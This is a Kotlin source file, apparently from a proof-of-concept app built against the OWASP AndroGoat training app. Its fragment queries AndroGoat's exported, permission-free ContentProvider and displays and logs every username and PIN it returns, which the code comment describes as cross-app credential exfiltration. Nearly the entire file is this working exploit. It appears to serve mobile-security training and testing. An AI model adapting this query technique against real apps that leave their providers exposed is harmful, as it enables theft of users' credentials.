package dev.xbara0x.androgoatpoc.ui.provider

import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.fragment.app.Fragment
import androidx.lifecycle.ViewModelProvider
import dev.xbara0x.androgoatpoc.databinding.FragmentProviderBinding

private const val TAG = "AndroGoatPoC"
private const val AUTHORITY = "owasp.sat.agoat.provider.userpinsprovider"
private val PINS_URI: Uri = Uri.parse("content://$AUTHORITY/user_pins")

/**
 * Reads AndroGoat's exported ContentProvider directly.
 *
 * AndroGoat declares `ContentProviderActivity` as a `<provider>` with
 * `android:exported="true"` and authority `owasp.sat.agoat.provider.userpinsprovider`,
 * without any readPermission. Its query() implementation does no caller check, so any
 * app can enumerate the `user_pins` table and read usernames + PINs.
 *
 * Unlike the broadcast receiver lesson (where the data is only shown in a Toast on the
 * victim's own UI), this is real cross-app credential exfiltration: the rows land in
 * *this* app's process.
 */
class ProviderLeakFragment : Fragment() {

    private var _binding: FragmentProviderBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        val vm = ViewModelProvider(this).get(ProviderLeakViewModel::class.java)
        _binding = FragmentProviderBinding.inflate(inflater, container, false)

        val textView: TextView = binding.textProviderContent
        vm.text.observe(viewLifecycleOwner) { textView.text = it }
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.buttonReadProvider.setOnClickListener { dumpUserPins() }
    }

    private fun dumpUserPins() {
        val sb = StringBuilder()
        try {
            val cursor = requireContext().contentResolver.query(PINS_URI, null, null, null, null)
            if (cursor == null) {
                sb.append("Provider returned no cursor. Is AndroGoat installed?\n")
            } else {
                cursor.use { c ->
                    val idIdx = c.getColumnIndex("id")
                    val userIdx = c.getColumnIndex("username")
                    val pinIdx = c.getColumnIndex("pin")
                    var rows = 0
                    while (c.moveToNext()) {
                        rows++
                        val id = if (idIdx >= 0) c.getLong(idIdx) else 0L
                        val user = if (userIdx >= 0) c.getString(userIdx) else "?"
                        val pin = if (pinIdx >= 0) c.getString(pinIdx) else "?"
                        sb.append("#$id  username=$user  pin=$pin\n")
                    }
                    Log.i(TAG, "Leaked $rows row(s) from $AUTHORITY")
                    if (rows == 0) sb.append("Provider reachable but returned 0 rows.\n")
                }
            }
        } catch (e: SecurityException) {
            sb.append("SecurityException: provider not readable (${e.message}).\n")
        } catch (e: Exception) {
            sb.append("Query failed: ${e.javaClass.simpleName}: ${e.message}\n")
        }
        binding.textProviderContent.text = sb.toString()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}